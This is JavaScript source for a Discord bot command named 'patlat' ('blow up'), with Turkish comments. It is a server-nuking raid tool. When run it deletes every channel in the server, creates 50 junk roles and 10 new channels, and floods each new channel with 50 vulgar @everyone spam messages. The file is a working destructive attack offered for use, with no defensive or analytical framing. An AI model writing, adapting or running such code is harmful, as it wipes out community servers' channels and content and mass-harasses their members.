module.exports = {
    data: {
      name: 'patlat', // Komut adı
      description: 'Sunucuyu patlatır, kanalları ve roller oluşturur.'
    },
    async execute(message, args) {
      const { guild } = message;
  
      // Tüm kanalları sil
      guild.channels.cache.forEach(channel => {
        channel.delete().catch(err => console.error(err));
      });
  
      // Rolleri oluştur
      for (let i = 0; i < 50; i++) {
        guild.roles.create({ name: 'Cyber' }).catch(err => console.error(err));
      }
  
      // Kanal ve spam mesajları gönder
      const channelNames = ["cloven", "cyber", "hack"];
      for (let i = 0; i < 10; i++) {
        const randomName = channelNames[Math.floor(Math.random() * channelNames.length)];
        guild.channels.create(randomName, { type: 'text' })
          .then(channel => {
            for (let j = 0; j < 50; j++) {
              channel.send('@everyone CLOVEN SIKTI!').catch(err => console.error(err));
            }
          })
          .catch(err => console.error(err));
      }
  
      message.reply('Sunucu patlatılıyor!');
    }
  };
  